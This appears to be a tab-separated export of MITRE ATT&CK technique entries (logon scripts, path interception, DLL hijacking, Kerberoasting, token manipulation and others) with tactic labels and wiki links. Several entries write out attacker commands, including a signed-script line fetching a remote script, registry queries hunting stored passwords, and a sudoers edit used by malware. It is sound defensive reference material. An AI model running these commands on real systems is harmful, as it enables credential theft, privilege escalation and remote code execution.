T1037	Logon Scripts	Windows\n\nWindows allows logon scripts to be run whenever a specific user or group of users log into a system. The scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server.\n\nIf adversaries can access these scripts, they may insert additional code into the logon script to execute their tools when a user logs in. This code can allow them to maintain persistence on a single system, if it is a local script, or to move laterally within a network, if the script is stored on a central server and pushed to many systems. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.\n\nMac\n\nMac allows login and logoff hooks to be run as root whenever a specific user logs into or out of a system. A login hook tells Mac OS X to execute a certain script when a user logs in, but unlike startup items, a login hook executes as root. There can only be one login hook at a time though. If adversaries can access these scripts, they can insert additional code to the script to execute their tools when a user logs in.	Lateral Movement, Persistence	[]	''	https://attack.mitre.org/wiki/Technique/T1037
T1034	Path Interception	Path interception occurs when an executable is placed in a specific path so that it is executed by an application instead of the intended target. One example of this was the use of a copy of [[Software/S0106|cmd]] in the current working directory of a vulnerable application that loads a CMD or BAT file with the CreateProcess function.\n\nThere are multiple distinct weaknesses or misconfigurations that adversaries may take advantage of when performing path interception: unquoted paths, path environment variable misconfigurations, and search order hijacking. The first vulnerability deals with full program paths, while the second and third occur when program paths are not specified. These techniques can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.\n\nUnquoted Paths\nService paths (stored in Windows Registry keys) and shortcut paths are vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., C:\unsafe path with space\program.exe vs. "C:\safe path with space\program.exe"). An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is C:\program files\myapp.exe, an adversary may create a program at C:\program.exe that will be run instead of the intended program.\n\nPATH Environment Variable Misconfiguration\nThe PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory, %SystemRoot%\system32 (e.g., C:\Windows\system32), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line.\n\nFor example, if C:\example path precedes C:\Windows\system32 is in the PATH environment variable, a program that is named net.exe and placed in C:\example path will be called instead of the Windows system "net" when "net" is executed from the command-line.\n\nSearch Order Hijacking\nSearch order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. The search order differs depending on the method that is used to execute the program. However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program\'s directory.\n\nFor example, "example.exe" runs "cmd.exe" with the command-line argument net user. An adversary may place a program called "net.exe" within the same directory as example.exe, "net.exe" will be run instead of the Windows system utility net. In addition, if an adversary places a program called "net.com" in the same directory as "net.exe", then cmd.exe /C net user will execute "net.com" instead of "net.exe" due to the order of executable extensions defined under PATHEXT.\n\nSearch order hijacking is also a common practice for hijacking DLL loads and is covered in [[Technique/T1038|DLL Search Order Hijacking]].	Persistence, Privilege Escalation	[]	''	https://attack.mitre.org/wiki/Technique/T1034
T1035	Service Execution	Adversaries may execute a binary, command, or script via a method that interacts with Windows services, such as the Service Control Manager. This can be done by either creating a new service or modifying an existing service. This technique is the execution used in conjunction with [[Technique/T1050|New Service]] and [[Technique/T1031|Modify Existing Service]] during service persistence or privilege escalation.	Execution	[]	''	https://attack.mitre.org/wiki/Technique/T1035
T1133	External Remote Services	Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [[Technique/T1028|Windows Remote Management]] can also be used externally.\n\nAdversaries may use remote services to access and persist within a network. Access to [[Technique/T1078|Valid Accounts]] to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. Access to remote services may be used as part of [[Technique/T1108|Redundant Access]] during an operation.	Persistence	[]	''	https://attack.mitre.org/wiki/Technique/T1133
T1132	Data Encoding	Command and control (C2) information is encoded using a standard data encoding system. Use of data encoding may be to adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64,  MIME, UTF-8, or other binary-to-text and character encoding systems. Some data encoding systems may also result in data compression, such as gzip.	Command and Control	[]	''	https://attack.mitre.org/wiki/Technique/T1132
T1038	DLL Search Order Hijacking	Windows systems use a common method to look for required DLLs to load into a program. Adversaries may take advantage of the Windows DLL search order and programs that ambiguously specify DLLs to gain privilege escalation and persistence. \n\nAdversaries may perform DLL preloading, also called binary planting attacks, by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program. Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL. Adversaries may use this behavior to cause the program to load a malicious DLL. \n\nAdversaries may also directly modify the way a program loads DLLs by replacing an existing DLL or modifying a .manifest or .local redirection file, directory, or junction to cause the program to load a different DLL to maintain persistence or privilege escalation.\n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program.\n\nPrograms that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.	Defense Evasion, Persistence, Privilege Escalation	[]	''	https://attack.mitre.org/wiki/Technique/T1038
T1039	Data from Network Shared Drive	Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to [[Exfiltration]].\n\nAdversaries may search network shares on computers they have compromised to find files of interest. Interactive command shells may be in use, and common functionality within [[Software/S0106|cmd]] may be used to gather information.	Collection	[]	''	https://attack.mitre.org/wiki/Technique/T1039
T1137	Office Application Startup	Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started.\n\nOffice Template Macros\n\nMicrosoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts.\n\nOffice Visual Basic for Applications (VBA) macros can inserted into the base templated and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded.\n\nWord Normal.dotm location:C:\Users\(username)\AppData\Roaming\Microsoft\Templates\Normal.dotm\n\nExcel Personal.xlsb location:C:\Users\(username)\AppData\Roaming\Microsoft\Excel\XLSTART\PERSONAL.XLSB\n\nAn adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.\n\nOffice Test\n\nA Registry location was found that when a DLL reference was placed within it the corresponding DLL pointed to by the binary path would be executed every time an Office application is started\n\nHKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf\n\nAdd-ins\n\nOffice add-ins can be used to add functionality to Office programs.\n\nAdd-ins can also be used to obtain persistence because they can be set to execute code when an Office application starts. There are different types of add-ins that can be used by the various Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), and Visual Studio Tools for Office (VSTO) add-ins.	Persistence	[]	''	https://attack.mitre.org/wiki/Technique/T1137
T1136	Create Account	Adversaries with a sufficient level of access may create a local system or domain account. Such accounts may be used for persistence that do not require persistent remote access tools to be deployed on the system.\n\nThe net user commands can be used to create a local or domain account.	Persistence	[]	''	https://attack.mitre.org/wiki/Technique/T1136
T1135	Network Share Discovery	Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. \n\nWindows\n\nFile sharing over a Windows network occurs over the SMB protocol.\n\n[[Software/S0039|Net]] can be used to query a remote system for available shared drives using the net view \\remotesystem command. It can also be used to query shared drives on the local system using net share.\n\nAdversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for [[Collection]] and to identify potential systems of interest for [[Lateral Movement]].\n\nMac\n\nOn Mac, locally mounted shares can be viewed with the df -aH command.	Discovery	[]	''	https://attack.mitre.org/wiki/Technique/T1135
T1134	Access Token Manipulation	Windows uses access tokens to determine the ownership of a running process.  A user can manipulate access tokens to make a running process appear as though it belongs to someone other than the user that started the process.  When this occurs, the process also takes on the security context associated with the new token.  For example, Microsoft promotes the use of access tokens as a security best practice.  Administrators should log in as a standard user but run their tools with administrator privileges using the built-in access token manipulation command runas. \n  \nAdversaries may use access tokens to operate under a different user or system security context to perform actions and evade detection. An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing.  An adversary must already be in a privileged user context (i.e. administrator) to steal a token.  However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.\n\nAccess tokens can be leveraged by adversaries through three methods:\n\nToken Impersonation/Theft - An adversary creates a new access token that duplicates an existing token using DuplicateToken(Ex). The token can then be used with ImpersonateLoggedOnUser to allow the calling thread to impersonate a logged on user's security context, or with SetThreadToken to assign the impersonated token to a thread. This is useful for when the target user has a non-network logon session on the system.\n\nCreate Process with a Token - An adversary creates a new access token with DuplicateToken(Ex) and uses it with CreateProcessWithTokenW to create a new process running under the security context of the impersonated user. This is useful for creating a new process under the security context of a different user.\n\nMake and Impersonate Token - An adversary has a username and password but the user is not logged onto the system. The adversary can then create a logon session for the user using the LogonUser function. The function will return a copy of the new session's access token and the adversary can use SetThreadToken to assign the token to a thread.\n\nAny standard user can use the runas command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account.\n\nMetasploit\u2019s Meterpreter payload allows arbitrary token manipulation and uses token impersonation to escalate privileges.   The Cobalt Strike beacon payload allows arbitrary token impersonation and can also create tokens. 	Defense Evasion, Privilege Escalation	[]	''	https://attack.mitre.org/wiki/Technique/T1134
T1209	Time Providers	The Windows Time service (W32Time) enables time synchronization across and within domains. W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients.\n\nTime providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of  HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\. The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed.\n\nAdversaries may abuse this architecture to establish [[Persistence]], specifically by registering and enabling a malicious DLL as a time provider. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account.	Persistence	[]	''	https://attack.mitre.org/wiki/Technique/T1209
T1208	Kerberoasting	Service principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service).\n\nAdversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC). Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline [[Technique/T1110|Brute Force]] attacks that may expose plaintext credentials.\n\nThis same attack could be executed using service tickets captured from network traffic.\n\nCracked hashes may enable [[Persistence]], [[Privilege Escalation]], and  [[Lateral Movement]] via access to [[Technique/T1078|Valid Accounts]].	Credential Access	[]	''	https://attack.mitre.org/wiki/Technique/T1208
T1201	Password Policy Discovery	Password policies for networks are a way to enforce complex passwords that are difficult to guess or crack through [[Technique/T1110|Brute Force]]. An adversary may attempt to access detailed information about the password policy used within an enterprise network. This would help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).\n\nPassword policies can be set and discovered on Windows, Linux, and macOS systems.\n\nWindows\n* net accounts\n* net accounts /domain\n\nLinux\n* chage -l <username>\n* cat /etc/pam.d/common-password\n\nmacOS\n* pwpolicy getaccountpolicies	Discovery	[]	''	https://attack.mitre.org/wiki/Technique/T1201
T1200	Hardware Additions	Computer accessories, computers or networking hardware may be introduced into a system as a vector to gain execution. While public references of usage by APT groups are scarce, many penetration testers leverage hardware additions for initial access. Commercial and open source products are leveraged with capabilities such as passive network tapping, man-in-the middle encryption breaking, keystroke injection, kernel memory reading via DMA, adding new wireless access to an existing network, and others.	Initial Access	[]	''	https://attack.mitre.org/wiki/Technique/T1200
T1203	Exploitation for Client Execution	Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.\n\nSeveral types exist:\n\nBrowser-based Exploitation\n\nWeb browsers are a common target through [[Technique/T1189|Drive-by Compromise]] and [[Technique/T1192|Spearphishing Link]]. Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.\n\nOffice Applications\n\nCommon office and productivity applications such as Microsoft Office are also targeted through [[Technique/T1193|Spearphishing Attachment]], [[Technique/T1192|Spearphishing Link]], and [[Technique/T1194|Spearphishing via Service]]. Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.\n\nCommon Third-party Applications\n\nOther applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.	Execution	[]	''	https://attack.mitre.org/wiki/Technique/T1203
T1202	Indirect Command Execution	Various Windows utilities may be used to execute commands, possibly without invoking [[Software/S0106|cmd]]. For example, [[Software/S0193|Forfiles]], the Program Compatibility Assistant (pcalua.exe), components of the Windows Subsystem for Linux (WSL), as well as other utilities may invoke the execution of programs and commands from a [[Technique/T1059|Command-Line Interface]], Run window, or via scripts.\n\nAdversaries may abuse these utilities for [[Defense Evasion]], specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of [[Software/S0106|cmd]].	Defense Evasion	[]	''	https://attack.mitre.org/wiki/Technique/T1202
T1205	Port Knocking	Port Knocking is a well-established method used by both defenders and adversaries to hide open ports from access.  To enable the port, the system expects a series of packets with certain characteristics before the port will be opened.  This is often accomlished by the host based firewall, but could also be implemented by custom software.  \n\nThis technique has been observed to both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.\n\nThe observation of the signal packets to trigger the communication can be conducted through different methods.  One means, originally implemented by Cd00r, is to use the libpcap libraries to sniff for the packets in question.  Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.	Command and Control, Defense Evasion, Persistence	[]	''	https://attack.mitre.org/wiki/Technique/T1205
T1204	User Execution	An adversary may rely upon specific actions by a user in order to gain execution. This may be direct code execution, such as when a user opens a malicious executable delivered via [[Technique/T1193|Spearphishing Attachment]] with the icon and apparent extension of a document file. It also may lead to other execution techniques, such as when a user clicks on a link delivered via [[Technique/T1192|Spearphishing Link]] that leads to exploitation of a browser or application vulnerability via [[Technique/T1203|Exploitation for Client Execution]]. While User Execution frequently occurs shortly after [[Initial Access]] it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it.	Execution	[]	''	https://attack.mitre.org/wiki/Technique/T1204
T1207	DCShadow	DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a Domain Controller (DC). Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys.\n\nRegistering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or the KRBTGT hash.\n\nThis technique may bypass system logging and security monitors such as security information and event management (SIEM) products (since actions taken on a rogue DC may not be reported to these sensors). The technique may also be used to alter and delete replication and other associated metadata to obstruct forensic analysis. Adversaries may also utilize this technique to perform [[Technique/T1178|SID-History Injection]] and/or manipulate AD objects (such as accounts, access control lists, schemas) to establish backdoors for [[Persistence]].	Defense Evasion	[]	''	https://attack.mitre.org/wiki/Technique/T1207
T1206	Sudo Caching	The sudo command "allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments" . Since sudo was made for the system administrator, it has some useful configuration features such as a timestamp_timeout that is the amount of time in minutes between instances of sudo before it will re-prompt for a password. This is because sudo has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at /var/db/sudo with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a tty_tickets variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).\n\nAdversaries can abuse poor configurations of this to escalate privileges without needing the user\'s password. /var/db/sudo\'s timestamp can be monitored to see if it falls within the timestamp_timeout range. If it does, then malware can execute sudo commands without needing to supply the user\'s password. Combined with tty_tickets being disabled, means adversaries can do this from any tty for that user. \n\nThe OSX Proton Malware has disabled tty_tickets to potentially make scripting easier by issuing echo \\'Defaults !tty_tickets\\' >> /etc/sudoers . In order for this change to be reflected, the Proton malware also must issue killall Terminal. As of macOS Sierra, the sudoers file has tty_tickets enabled by default.	Privilege Escalation	[]	''	https://attack.mitre.org/wiki/Technique/T1206
T1066	Indicator Removal from Tools	If a malicious tool is detected and quarantined or otherwise curtailed, an adversary may be able to determine why the malicious tool was detected (the indicator), modify the tool by removing the indicator, and use the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.\n\nA good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may use [[Technique/T1045|Software Packing]] or otherwise modify the file so it has a different signature, and then re-use the malware.	Defense Evasion	[]	''	https://attack.mitre.org/wiki/Technique/T1066
T1047	Windows Management Instrumentation	Windows Management Instrumentation (WMI) is a Windows administration feature that provides a uniform environment for local and remote access to Windows system components. It relies on the WMI service for local and remote access and the server message block (SMB) and Remote Procedure Call Service (RPCS) for remote access. RPCS operates over port 135.\n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to perform many tactic functions, such as gathering information for [[Discovery]] and remote [[Execution]] of files as part of [[Lateral Movement]].	Execution	[]	''	https://attack.mitre.org/wiki/Technique/T1047
T1128	Netsh Helper DLL	Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility. The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at HKLM\SOFTWARE\Microsoft\Netsh.\n\nAdversaries can use netsh.exe with helper DLLs to proxy execution of arbitrary code in a persistent manner when netsh.exe is executed automatically with another [[Persistence]] technique or if other persistent software is present on the system that executes netsh.exe as part of its normal functionality. Examples include some VPN software that invoke netsh.exe.\n\nProof of concept code exists to load Cobalt Strike's payload using netsh.exe helper DLLs.	Persistence	[]	''	https://attack.mitre.org/wiki/Technique/T1128
T1129	Execution through Module Load	The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in NTDLL.dll and is part of the Windows Native API which is called from functions like CreateProcess(), LoadLibrary(), etc. of the Win32 API.\n\nThe module loader can load DLLs:\n\n*via specification of the (fully-qualified or relative) DLL pathname in the IMPORT directory;\n    \n*via EXPORT forwarded to another DLL, specified with (fully-qualified or relative) pathname (but without extension);\n    \n*via an NTFS junction or symlink program.exe.local with the fully-qualified or relative pathname of a directory containing the DLLs specified in the IMPORT directory or forwarded EXPORTs;\n    \n*via <file name="filename.extension" loadFrom="fully-qualified or relative pathname"> in an embedded or external "application manifest". The file name refers to an entry in the IMPORT directory or a forwarded EXPORT.\n\nAdversaries can use this functionality as a way to execute arbitrary code on a system.	Execution	[]	''	https://attack.mitre.org/wiki/Technique/T1129
T1171	LLMNR/NBT-NS Poisoning	Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name.\n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [[Technique/T1040|Network Sniffing]] and crack the hashes offline through [[Technique/T1110|Brute Force]] to obtain the plaintext passwords.\n\nSeveral tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and [[Software/S0174|Responder]].	Credential Access	[]	''	https://attack.mitre.org/wiki/Technique/T1171
T1120	Peripheral Device Discovery	Adversaries may attempt to gather information about attached peripheral devices and components connected to a computer system. The information may be used to enhance their awareness of the system and network environment or may be used for further actions.	Discovery	[]	''	https://attack.mitre.org/wiki/Technique/T1120
T1121	Regsvcs/Regasm	Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies. Both are digitally signed by Microsoft.\n\nAdversaries can use Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Both utilities may be used to bypass process whitelisting through use of attributes within the binary to specify code that should be run before registration or unregistration: [ComRegisterFunction] or [ComUnregisterFunction] respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute.	Defense Evasion, Execution	[]	''	https://attack.mitre.org/wiki/Technique/T1121
T1122	Component Object Model Hijacking	The Microsoft Component Object Model (COM) is a system within Windows to enable interaction between software components through the operating system. Adversaries can use this system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Windows Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead. An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection.	Defense Evasion, Persistence	[]	''	https://attack.mitre.org/wiki/Technique/T1122
T1123	Audio Capture	An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.	Collection	[]	''	https://attack.mitre.org/wiki/Technique/T1123
T1124	System Time Discovery	The system time is set and stored by the Windows Time Service within a domain to maintain time synchronization between systems and services in an enterprise network.\n\nAn adversary may gather the system time and/or time zone from a local or remote system. This information may be gathered in a number of ways, such as with [[Software/S0039|Net]] on Windows by performing net time \\hostname to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using w32tm /tz. The information could be useful for performing other techniques, such as executing a file with a [[Technique/T1053|Scheduled Task]], or to discover locality information based on time zone to assist in victim targeting.	Discovery	[]	''	https://attack.mitre.org/wiki/Technique/T1124
T1125	Video Capture	An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.\n\nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from [[Technique/T1113|Screen Capture]] due to use of specific devices or applications for video recording rather than capturing the victim's screen.\n\nIn macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton. 	Collection	[]	''	https://attack.mitre.org/wiki/Technique/T1125
T1126	Network Share Connection Removal	Windows shared drive and [[Technique/T1077|Windows Admin Shares]] connections can be removed when no longer needed. [[Software/S0039|Net]] is an example utility that can be used to remove network share connections with the net use \\system\share /delete command.\n\nAdversaries may remove share connections that are no longer useful in order to clean up traces of their operation.	Defense Evasion	[]	''	https://attack.mitre.org/wiki/Technique/T1126
T1127	Trusted Developer Utilities	There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering. These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application whitelisting defensive solutions.\n\nMSBuild\n\nMSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It takes XML formatted project files that define requirements for building various platforms and configurations. \n\nAdversaries can use MSBuild to proxy execution of code through a trusted Windows utility. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# code to be inserted into the XML project file. MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application whitelisting defenses that are configured to allow MSBuild.exe execution.\n\nDNX\n\nThe .NET Execution Environment (DNX), dnx.exe, is a software development kit packaged with Visual Studio Enterprise. It was retired in favor of .NET Core CLI in 2016. DNX is not present on standard builds of Windows and may only be present on developer workstations using older versions of .NET Core and ASP.NET Core 1.0. The dnx.exe executable is signed by Microsoft. \n\nAn adversary can use dnx.exe to proxy execution of arbitrary code to bypass application whitelist policies that do not account for DNX.\n\nRCSI\n\nThe rcsi.exe utility is a non-interactive command-line interface for C# that is similar to csi.exe. It was provided within an early version of the Roslyn .NET Compiler Platform but has since been deprecated for an integrated solution. The rcsi.exe binary is signed by Microsoft.\n\nC# .csx script files can be written and executed with rcsi.exe at the command-line. An adversary can use rcsi.exe to proxy execution of arbitrary code to bypass application whitelisting policies that do not account for execution of rcsi.exe.\n\nWinDbg/CDB\n\nWinDbg is a Microsoft Windows kernel and user-mode debugging utility. The Microsoft Console Debugger (CDB) cdb.exe is also user-mode debugger. Both utilities are included in Windows software development kits and can be used as standalone tools. They are commonly used in software development and reverse engineering and may not be found on typical Windows systems. Both WinDbg.exe and cdb.exe binaries are signed by Microsoft.\n\nAn adversary can use WinDbg.exe and cdb.exe to proxy execution of arbitrary code to bypass application whitelist policies that do not account for execution of those utilities.\n\nIt is likely possible to use other debuggers for similar purposes, such as the kernel-mode debugger kd.exe, which is also signed by Microsoft.\n\nTracker\n\nThe file tracker utility, tracker.exe, is included with the .NET framework as part of MSBuild. It is used for logging calls to the Windows file system.\n\nAn adversary can use tracker.exe to proxy execution of an arbitrary DLL into another process. Since tracker.exe is also signed it can be used to bypass application whitelisting solutions.	Defense Evasion, Execution	[]	''	https://attack.mitre.org/wiki/Technique/T1127
T1216	Signed Script Proxy Execution	Scripts signed with trusted certificates can be used to proxy execution of malicious files. This behavior may bypass signature validation restrictions and application whitelisting solutions that do not account for use of these scripts.\n\nPubPrn.vbs is signed by Microsoft and can be used to proxy execution from a remote site. Example command: cscript C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 script:http[:]//192.168.1.100/hi.png\n\nThere are several other signed scripts that may be used in a similar manner.	Defense Evasion, Execution	[]	''	https://attack.mitre.org/wiki/Technique/T1216
T1217	Browser Bookmark Discovery	Adversaries may enumerate browser bookmarks to learn more about compromised hosts. Browser bookmarks may reveal personal information about users (ex: banking sites, interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure.\n\nBrowser bookmarks may also highlight additional targets after an adversary has access to valid credentials, especially [[Technique/T1081|Credentials in Files]] associated with logins cached by a browser.\n\nSpecific storage locations vary based on platform and/or application, but browser bookmarks are typically stored in local files/databases.	Discovery	[]	''	https://attack.mitre.org/wiki/Technique/T1217
T1214	Credentials in Registry	The Windows Registry stores configuration information that can be used by the system or other programs. Adversaries may query the Registry looking for credentials and passwords that have been stored for use by other programs or services. Sometimes these credentials are used for automatic logons.\n\nExample commands to find Registry keys related to password information:\n*Local Machine Hive: reg query HKLM /f password /t REG_SZ /s\n*Current User Hive: reg query HKCU /f password /t REG_SZ /s	Credential Access	[]	''	https://attack.mitre.org/wiki/Technique/T1214
T1044	File System Permissions Weakness	Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\nServices\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\nExecutable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the %TEMP% directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [[Technique/T1038|DLL Search Order Hijacking]]. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [[Technique/T1088|Bypass User Account Control]]. Several examples of this weakness in existing common installers have been reported to software vendors.	Persistence, Privilege Escalation	[]	''	https://attack.mitre.org/wiki/Technique/T1044
